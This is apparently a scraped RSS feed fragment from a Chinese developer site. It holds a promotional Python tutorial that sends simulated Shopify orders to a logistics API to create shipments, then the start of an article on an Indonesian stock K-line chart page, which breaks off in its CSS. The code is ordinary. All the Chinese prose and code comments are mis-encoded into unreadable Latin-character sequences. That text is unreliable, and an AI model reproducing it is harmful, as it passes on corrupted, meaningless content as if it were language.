.task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½œä¸ºä¸€åè·¨å¢ƒå–å®¶ï¼Œä½ æ˜¯å¦ä¹Ÿæ›¾ç–²äºåœ¨Shopifyã€å¹¿å‘Šå¹³å°å’Œç‰©æµå•†ä¹‹é—´åå¤æ¨ªè·³ï¼Ÿæ‰‹åŠ¨å¤„ç†è®¢å•ã€æ›´æ–°ç‰©æµä¿¡æ¯ï¼Œä¸ä»…æ•ˆç‡ä½ä¸‹ï¼Œè¿˜ææ˜“å‡ºé”™ã€‚ä»Šå¤©ï¼Œå°±è®©æˆ‘ä»¬ç”¨Pythonå’Œæ˜ŸæAPIï¼Œæ‰“é€ ä¸€ä¸ªä¸“å±çš„è®¢å•è‡ªåŠ¨åŒ–æµæ°´çº¿ï¼ŒæŠŠæ—¶é—´å’Œç²¾åŠ›è¿˜ç»™é€‰å“ä¸è¥é”€ã€‚</p>
<hr/>
<p>å¯¹äºæ—¥è®¢å•é‡ä¸Šç™¾çš„è·¨å¢ƒå–å®¶è€Œè¨€ï¼Œè®¢å•å¤„ç†ç¯èŠ‚çš„â€œäººæ•ˆâ€æ˜¯åˆ¶çº¦å‘å±•çš„å…³é”®ç“¶é¢ˆã€‚å®¢æœæ‰‹åŠ¨å¯¼å‡ºè®¢å•ã€æ‰“åŒ…ååˆè¦æ‰‹åŠ¨ä¸Šä¼ å•å·ã€æ ‡è®°å‘è´§â€¦â€¦è¿™å¥—æµç¨‹ä¸ä»…æ¶ˆè€—äº†å¤§é‡äººåŠ›ï¼Œè€Œä¸”åœ¨è®¢å•é«˜å³°æœŸï¼Œä»»ä½•ä¸€æ­¥çš„ç–å¿½éƒ½å¯èƒ½å¯¼è‡´å‘é”™è´§ã€æ¼å‘è´§ç­‰ä¸¥é‡å®¢è¯‰ã€‚</p>
<p><strong>å¦‚ä½•ç ´å±€ï¼Ÿç­”æ¡ˆæ˜¯APIè‡ªåŠ¨åŒ–ã€‚</strong></p>
<p>æ˜Ÿæè·¨å¢ƒæœåŠ¡å•†ä¸ºæ­¤æä¾›äº†ç¨³å®šã€é«˜æ•ˆä¸”æ–‡æ¡£æ¸…æ™°çš„RESTful APIæ¥å£ï¼Œå…è®¸å¼€å‘è€…å°†æ˜Ÿæå¼ºå¤§çš„ç‰©æµä¸è®¢å•ç®¡ç†èƒ½åŠ›ï¼Œæ— ç¼é›†æˆåˆ°è‡ªå·±çš„ä¸šåŠ¡ç³»ç»Ÿä¸­ã€‚</p>
<p><strong>å®æˆ˜ï¼šç”¨Pythonæ„å»ºShopifyè®¢å•è‡ªåŠ¨åŒ–æµç¨‹</strong></p>
<p>å‡è®¾æˆ‘ä»¬æœ‰è¿™æ ·ä¸€ä¸ªæ ¸å¿ƒéœ€æ±‚ï¼š<strong>å®šæ—¶è·å–Shopifyçš„æ–°è®¢å•ï¼Œå¹¶é€šè¿‡æ˜ŸæAPIè‡ªåŠ¨å®Œæˆå‘è´§æ“ä½œã€‚</strong> Â ä¸‹é¢ï¼Œæˆ‘ä»¬åˆ†æ­¥å®ç°ã€‚</p>
<p><strong>ç¬¬ä¸€æ­¥ï¼šç¯å¢ƒå‡†å¤‡ä¸è®¤è¯</strong></p>
<p>é¦–å…ˆï¼Œç¡®ä¿ä½ å·²å®‰è£…äº†Pythonçš„<code>requests</code>åº“ã€‚æ˜ŸæAPIé€šå¸¸ä½¿ç”¨API Keyè¿›è¡Œè®¤è¯ï¼Œä½ å¯ä»¥åœ¨æ˜Ÿæå¼€å‘è€…åå°è·å–å®ƒã€‚
python</p>
<pre><code class="hljs language-makefile" lang="makefile">import requests
import json

<span class="hljs-comment"># æ˜ŸæAPIé…ç½®</span>
XINGXI_API_KEY = <span class="hljs-string">"ä½ çš„æ˜ŸæAPIå¯†é’¥"</span>
XINGXI_BASE_URL = <span class="hljs-string">"https://api.xingxi.com/v1"</span> <span class="hljs-comment"># ç¤ºä¾‹åœ°å€ï¼Œè¯·ä»¥å®˜æ–¹æ–‡æ¡£ä¸ºå‡†</span>

<span class="hljs-comment"># è®¾ç½®è¯·æ±‚å¤´</span>
headers = {
    <span class="hljs-string">"Authorization"</span>: f<span class="hljs-string">"Bearer {XINGXI_API_KEY}"</span>,
    <span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"application/json"</span>
}
</code></pre>
<p><strong>ç¬¬äºŒæ­¥ï¼šè·å–å¾…å¤„ç†è®¢å•</strong></p>
<p>è¿™é‡Œæˆ‘ä»¬æ¨¡æ‹Ÿä»Shopifyè·å–åˆ°çš„è®¢å•åˆ—è¡¨ã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼Œä½ éœ€è¦è°ƒç”¨Shopifyçš„APIæ¥è·å–æœªå±¥è¡Œçš„è®¢å•ã€‚</p>
<p>python</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># æ¨¡æ‹Ÿä»Shopifyè·å–çš„è®¢å•æ•°æ®</span>
<span class="hljs-attr">shopify_orders</span> = [
    {
        <span class="hljs-string">"order_id"</span>: <span class="hljs-string">"SH123456"</span>,
        <span class="hljs-string">"customer"</span>: <span class="hljs-string">"John Doe"</span>,
        <span class="hljs-string">"line_items"</span>: [{<span class="hljs-string">"title"</span>: <span class="hljs-string">"Product A"</span>, <span class="hljs-string">"quantity"</span>: <span class="hljs-number">1</span>}]
    }
]
</code></pre>
<p><strong>ç¬¬ä¸‰æ­¥ï¼šè°ƒç”¨æ˜ŸæAPIåˆ›å»ºè¿å•</strong></p>
<p>è¿™æ˜¯æ ¸å¿ƒæ­¥éª¤ã€‚æˆ‘ä»¬éå†Shopifyè®¢å•ï¼Œä¸ºæ¯ä¸€ä¸ªè®¢å•è°ƒç”¨æ˜Ÿæçš„è¿å•åˆ›å»ºæ¥å£ã€‚</p>
<p>python</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">for</span> order <span class="hljs-keyword">in</span> shopify_orders:
    <span class="hljs-comment"># æ„å»ºè¯·æ±‚ä½“ï¼Œæ ¹æ®æ˜ŸæAPIæ–‡æ¡£è¦æ±‚ä¼ é€’å‚æ•°</span>
    shipping_data = {
        <span class="hljs-string">"order_sn"</span>: order[<span class="hljs-string">"order_id"</span>], <span class="hljs-comment"># ä½¿ç”¨Shopifyè®¢å•å·ä½œä¸ºå¤–éƒ¨å•å·</span>
        <span class="hljs-string">"recipient"</span>: {...}, <span class="hljs-comment"># æ”¶ä»¶äººä¿¡æ¯ï¼Œå¯ä»Shopifyè®¢å•ä¸­æå–</span>
        <span class="hljs-string">"package_info"</span>: {...}, <span class="hljs-comment"># åŒ…è£¹ä¿¡æ¯</span>
        <span class="hljs-string">"channel_code"</span>: <span class="hljs-string">"UPS"</span> <span class="hljs-comment"># é€‰æ‹©çš„ç‰©æµæ¸ é“</span>
    }
    
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># å‘é€POSTè¯·æ±‚åˆ›å»ºè¿å•</span>
        response = requests.post(
            <span class="hljs-string">f"<span class="hljs-subst">{XINGXI_BASE_URL}</span>/shipping/order/create"</span>,
            headers=headers,
            data=json.dumps(shipping_data)
        )
        response.raise_for_status() <span class="hljs-comment"># å¦‚æœçŠ¶æ€ç ä¸æ˜¯200ï¼Œåˆ™æŠ›å‡ºå¼‚å¸¸</span>
        
        result = response.json()
        
        <span class="hljs-comment"># åˆ¤æ–­è¯·æ±‚æ˜¯å¦æˆåŠŸ</span>
        <span class="hljs-keyword">if</span> result.get(<span class="hljs-string">"code"</span>) == <span class="hljs-number">200</span>:
            tracking_number = result[<span class="hljs-string">"data"</span>][<span class="hljs-string">"tracking_number"</span>]
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"è®¢å• <span class="hljs-subst">{order[<span class="hljs-string">'order_id'</span>]}</span> å‘è´§æˆåŠŸï¼ç‰©æµå•å·ï¼š<span class="hljs-subst">{tracking_number}</span>"</span>)
            
            <span class="hljs-comment"># ç¬¬å››æ­¥ï¼ˆå¯é€‰ï¼‰ï¼šå›å†™ç‰©æµå•å·åˆ°Shopify</span>
            <span class="hljs-comment"># è¿™é‡Œå¯ä»¥è°ƒç”¨Shopify APIï¼Œæ›´æ–°è¯¥è®¢å•çš„ç‰©æµä¿¡æ¯å¹¶æ ‡è®°ä¸ºå·²å‘è´§ã€‚</span>
            <span class="hljs-comment"># update_shopify_fulfillment(order['order_id'], tracking_number)</span>
            
        <span class="hljs-keyword">else</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"è®¢å• <span class="hljs-subst">{order[<span class="hljs-string">'order_id'</span>]}</span> å¤„ç†å¤±è´¥ï¼š<span class="hljs-subst">{result.get(<span class="hljs-string">'message'</span>)}</span>"</span>)
            
    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"è¯·æ±‚æ˜ŸæAPIæ—¶å‘ç”Ÿé”™è¯¯: <span class="hljs-subst">{e}</span>"</span>)
</code></pre>
<p><strong>ä»·å€¼å‡åä¸è¡ŒåŠ¨å¼•å¯¼</strong></p>
<p>é€šè¿‡è¿™ä¸ªç®€å•çš„è„šæœ¬ï¼Œæˆ‘ä»¬å®ç°äº†ä»è®¢å•è·å–åˆ°å‘è´§çš„å…¨æµç¨‹è‡ªåŠ¨åŒ–ã€‚ä¸€æ—¦éƒ¨ç½²ï¼Œç³»ç»Ÿå¯ä»¥7x24å°æ—¶æ— é—´æ–­è¿è¡Œï¼Œå°†äººåŠ›ä»é‡å¤åŠ³åŠ¨ä¸­å½»åº•è§£æ”¾ï¼Œå®ç°é™æœ¬å¢æ•ˆã€‚</p>
<p>è¿™åªæ˜¯æ˜ŸæAPIèƒ½åŠ›çš„å†°å±±ä¸€è§’ã€‚ä½ è¿˜å¯ä»¥åˆ©ç”¨å®ƒï¼š</p>
<ul>
<li><strong>åŒæ­¥åº“å­˜</strong>ï¼šå®æ—¶åŒæ­¥å¤šä¸ªä»“åº“çš„åº“å­˜æ•°æ®åˆ°å„å¤§é”€å”®å¹³å°ï¼Œé¿å…è¶…å–ã€‚</li>
<li><strong>ç”Ÿæˆæ•°æ®æŠ¥è¡¨</strong>ï¼šè‡ªåŠ¨æ‹‰å–ç‰©æµè½¨è¿¹ã€è¿è´¹æˆæœ¬ç­‰æ•°æ®ï¼Œç”Ÿæˆå¯è§†åŒ–æŠ¥è¡¨ã€‚</li>
</ul>
<p>æŠ€æœ¯æ˜¯é©±åŠ¨è·¨å¢ƒä¸šåŠ¡å¢é•¿çš„æ ¸å¿ƒå¼•æ“ã€‚ç«‹å³<strong>è®¿é—®æ˜Ÿæå®˜ç½‘çš„å¼€å‘è€…ä¸­å¿ƒ</strong>ï¼ŒæŸ¥é˜…å®Œæ•´çš„APIæ–‡æ¡£ï¼Œå¼€å¯ä½ çš„è‡ªåŠ¨åŒ–ä¹‹æ—…å§ï¼æˆ‘ä»¬è¿˜ä¸ºæ–°ç”¨æˆ·æä¾›äº†å……è¶³çš„<strong>å…è´¹APIè°ƒç”¨é¢åº¦</strong>ï¼ŒåŠ©ä½ æ— å¿§æµ‹è¯•ä¸é›†æˆã€‚</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å°åº¦å°¼è¥¿äºšè‚¡ç¥¨å¤šæ—¶é—´æ¡†æ¶Kçº¿æ•°æ®å¯è§†åŒ–é¡µé¢]]></title>    <link>https://juejin.cn/post/7577042851079782443</link>    <guid>https://juejin.cn/post/7577042851079782443</guid>    <pubDate>2025-11-27T06:25:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577042851079782443" data-draft-id="7576955345378951231" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å°åº¦å°¼è¥¿äºšè‚¡ç¥¨å¤šæ—¶é—´æ¡†æ¶Kçº¿æ•°æ®å¯è§†åŒ–é¡µé¢"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,JavaScript"/> <meta itemprop="datePublished" content="2025-11-27T06:25:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="StockPP"/> <meta itemprop="url" content="https://juejin.cn/user/4176365494996116"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å°åº¦å°¼è¥¿äºšè‚¡ç¥¨å¤šæ—¶é—´æ¡†æ¶Kçº¿æ•°æ®å¯è§†åŒ–é¡µé¢
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4176365494996116/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    StockPP
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:25:34.000Z" title="Thu Nov 27 2025 06:25:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å°åº¦å°¼è¥¿äºšè‚¡ç¥¨å¤šæ—¶é—´æ¡†æ¶Kçº¿æ•°æ®å¯è§†åŒ–é¡µé¢</h2>
<p>ä¸‹é¢æˆ‘å°†ä¸ºæ‚¨åˆ›å»ºä¸€ä¸ªç›´è§‚å±•ç¤ºå°å°¼è‚¡ç¥¨å¤šæ—¶é—´æ¡†æ¶Kçº¿æ•°æ®çš„HTMLé¡µé¢ï¼Œæ”¯æŒ1åˆ†é’Ÿåˆ°1ä¸ªæœˆçš„ä¸åŒæ—¶é—´å‘¨æœŸåˆ‡æ¢ã€‚</p>
<h3 data-id="heading-1">è®¾è®¡æ€è·¯</h3>
<p>é¦–å…ˆåˆ†æéœ€æ±‚ï¼šéœ€è¦å±•ç¤ºå°å°¼è‚¡ç¥¨çš„Kçº¿æ•°æ®ï¼Œæ”¯æŒ1åˆ†é’Ÿã€5åˆ†é’Ÿã€15åˆ†é’Ÿã€30åˆ†é’Ÿã€1å°æ—¶ã€1æ—¥å’Œ1æœˆç­‰ä¸åŒæ—¶é—´æ¡†æ¶çš„åˆ‡æ¢ã€‚é¡µé¢éœ€è¦ç›´è§‚æ˜“ç”¨ï¼ŒåŒ…å«Kçº¿å›¾ã€æŠ€æœ¯æŒ‡æ ‡å’Œäº¤äº’æ§åˆ¶é¢æ¿ã€‚ ä»¥ä¸‹æ˜¯å®Œæ•´çš„å®ç°ä»£ç ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>å°å°¼è‚¡ç¥¨å¤šæ—¶é—´æ¡†æ¶Kçº¿æ•°æ®<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.jsdelivr.net/npm/echarts@5.4.3/dist/echarts.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
        * {
            <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;
            <span class="hljs-attribute">box-sizing</span>: border-box;
            <span class="hljs-attribute">font-family</span>: <span class="hljs-string">'Segoe UI'</span>, Tahoma, Geneva, Verdana, sans-serif;
        }
        
        <span class="hljs-selector-tag">body</span> {
            <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">135deg</span>, <span class="hljs-number">#1a2a3a</span> <span class="hljs-number">0%</span>, <span class="hljs-number">#0d1b2a</span> <span class="hljs-number">100%</span>);
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#e0e0e0</span>;
            <span class="hljs-attribute">min-height</span>: <span class="hljs-number">100vh</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
        }
        
        <span class="hljs-selector-class">.container</span> {
            <span class="hljs-attribute">max-width</span>: <span class="hljs-number">1400px</span>;
            <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;
        }
        
        <span class="hljs-selector-tag">header</span> {
            <span class="hljs-attribute">text-align</span>: center;
            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">16</span>, <span class="hljs-number">30</span>, <span class="hljs-number">44</span>, <span class="hljs-number">0.8</span>);
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">10px</span>;
            <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">4px</span> <span class="hljs-number">15px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.2</span>);
        }
        
        <span class="hljs-selector-tag">h1</span> {
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#4fc3f7</span>;
            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">10px</span>;
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">2.2rem</span>;
        }
        
        <span class="hljs-selector-class">.subtitle</span> {
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#90a4ae</span>;
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1.1rem</span>;
        }
        
        <span class="hljs-selector-class">.content</span> {
            <span class="hljs-attribute">display</span>: flex;
            <span class="hljs-attribute">gap</span>: <span class="hljs-number">20px</span>;
        }
        
        <span class="hljs-selector-class">.chart-container</span> {
            <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;
            <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">16</span>, <span class="hljs-number">30</span>, <span class="hljs-number">44</span>, <span class="hljs-number">0.8</span>);
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">10px</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">4px</span> <span class="hljs-number">15px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.2</span>);
        }
        
        <span class="hljs-selector-class">.panel</span> {
            <span class="hljs-attribute">width</span>: <span class="hljs-number">280px</span>;
            <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">16</span>, <span class="hljs-number">30</span>, <span class="hljs-number">44</span>, <span class="hljs-number">0.8</span>);
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">10px</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">4px</span> <span class="hljs-number">15px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.2</span>);
        }
        
        <span class="hljs-selector-class">.interval-selector</span> {
            <span class="hljs-attribute">display</span>: grid;
            <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>fr);
            <span class="hljs-attribute">gap</span>: <span class="hljs-number">10px</span>;
            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">20px</span>;
        }
        
        <span class="hljs-selector-class">.interval-btn</span> {
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">12px</span> <span class="hljs-number">8px</span>;
            <span class="hljs-attribute">background</span>: <span class="hljs-number">#1e3a5c</span>;
            <span class="hljs-attribute">border</span>: none;
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">6px</span>;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#bbdefb</span>;
            <span class="hljs-attribute">cursor</span>: pointer;
            <span class="hljs-attribute">transition</span>: all <span class="hljs-number">0.3s</span>;
            <span class="hljs-attribute">font-weight</span>: <span class="hljs-number">600</span>;
            <span class="hljs-attribute">text-align</span>: center;
        }
        
        <span class="hljs-selector-class">.interval-btn</span><span class="hljs-selector-pseudo">:hover</span> {
            <span class="hljs-attribute">background</span>: <span class="hljs-number">#2a4d7a</span>;
            <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(-<span class="hljs-number">2px</span>);
        }
        
        <span class="hljs-selector-class">.interval-btn</span><span class="hljs-selector-class">.active</span> {
            <span class="hljs-attribute">background</span>: <span class="hljs-number">#1565c0</span>;
            <span class="hljs-attribute">color</span>: white;
            <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">8px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">21</span>, <span class="hljs-number">101</span>, <span class="hljs-number">192</span>, <span class="hljs-number">0.4</span>);
        }
        
        <span class="hljs-selector-class">.stock-selector</span> {
            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">20px</span>;
        }
        
        <span class="hljs-selector-class">.stock-selector</span> select {
            <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">12px</span>;
            <span class="hljs-attribute">background</span>: <span class="hljs-number">#1e3a5c</span>;
            <span class="hljs-attribute">border</span>: none;
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">6px</span>;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#e0e0e0</span>;
